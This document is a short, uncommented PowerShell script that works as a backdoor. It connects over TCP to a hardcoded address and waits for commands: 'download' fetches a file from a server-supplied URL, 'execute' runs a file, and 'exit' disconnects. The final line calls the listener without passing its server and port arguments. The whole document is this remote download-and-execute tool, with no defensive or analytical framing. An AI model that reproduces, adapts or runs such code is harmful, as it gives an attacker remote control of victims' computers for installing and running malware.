Function Download-File {
    param(
        [string]$url,
        [string]$filePath
    )

    $client = New-Object System.Net.WebClient
    $client.DownloadFile($url, $filePath)
}
Function Execute-File {
    param(
        [string]$filePath
    )

    & $filePath
}
Function Receive-Commands {
    param(
        [string]$server,
        [int]$port
    )

    $client = New-Object System.Net.Sockets.TCPClient($server, $port)
    $stream = $client.GetStream()

    while ($client.Connected) {
        if ($stream.DataAvailable) {
            $reader = New-Object System.IO.StreamReader($stream)
            $command = $reader.ReadLine()
            switch ($command) {
                'download' {
                    $url = $reader.ReadLine()
                    $filePath = $reader.ReadLine()
                    Download-File -url $url -filePath $filePath
                }
                'execute' {
                    $filePath = $reader.ReadLine()
                    Execute-File -filePath $filePath
                }
                'exit' {
                    $client.Close()
                }
            }
        }
    }
}

$server = "192.168.1.100"
$port = 1234
Receive-Commands 
